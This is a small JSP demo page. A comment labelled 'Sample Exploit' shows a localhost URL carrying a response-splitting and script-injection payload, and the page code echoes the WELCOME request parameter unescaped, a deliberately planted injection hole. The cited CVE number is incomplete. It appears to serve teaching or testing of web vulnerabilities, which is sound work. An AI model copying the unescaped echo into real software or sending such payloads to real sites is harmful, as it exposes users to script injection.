<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Insert title here</title>
</head>
<body>
<b>HELLO - demo.jsp here</b>
<br>

<!-- 
Sample Exploit - CVE-4993

%0A == LF
%0A%0A is call "Response Splitting"
http://localhost:8080/Test1.war/?WELCOME=language=en%0A%0A%3Chtml%3E%3Cscript%3Ealert("Your Hacked!!!")%3C/script%3E%3Cbody%3E%3Ch1%3EWelcome!%3C/h1%3E%3C/body%3E%3C/html%3E%3C!
-->

<%
if (request.getParameter("WELCOME") == null)
{ out.println("Please enter the welcome string"); }
else
{ out.println("Hello <b>"+request. getParameter("WELCOME")+"</b>!"); }
%>

Rest of original page

</body>
</html>
